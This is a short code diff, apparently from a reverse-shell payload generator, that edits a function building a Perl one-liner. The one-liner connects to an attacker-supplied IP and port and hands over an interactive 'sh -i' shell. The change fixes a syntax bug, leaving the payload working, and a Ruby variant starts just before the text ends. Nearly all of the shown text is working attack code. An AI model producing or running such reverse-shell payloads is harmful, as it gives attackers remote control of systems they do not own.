@@ -155,14 +155,13 @@ string perl(string ip, string port)
 {
   string shell,s1,s2,s3,s4;
   s1="perl -e 'use Socket;$i=\"";
-  s2=ip + "\"" + ";$p=" + port + ";";
-  s3="socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));";
-  s4="else if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";
+  s2=ip + "\"" + ";" + "$p=";
+  s3=port + ";";
+  s4="socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'";
   shell=s1+s2+s3+s4;
   return shell;
 
 }
-
 string ruby(string ip, string port)
 {
   string shell,s1,s2;
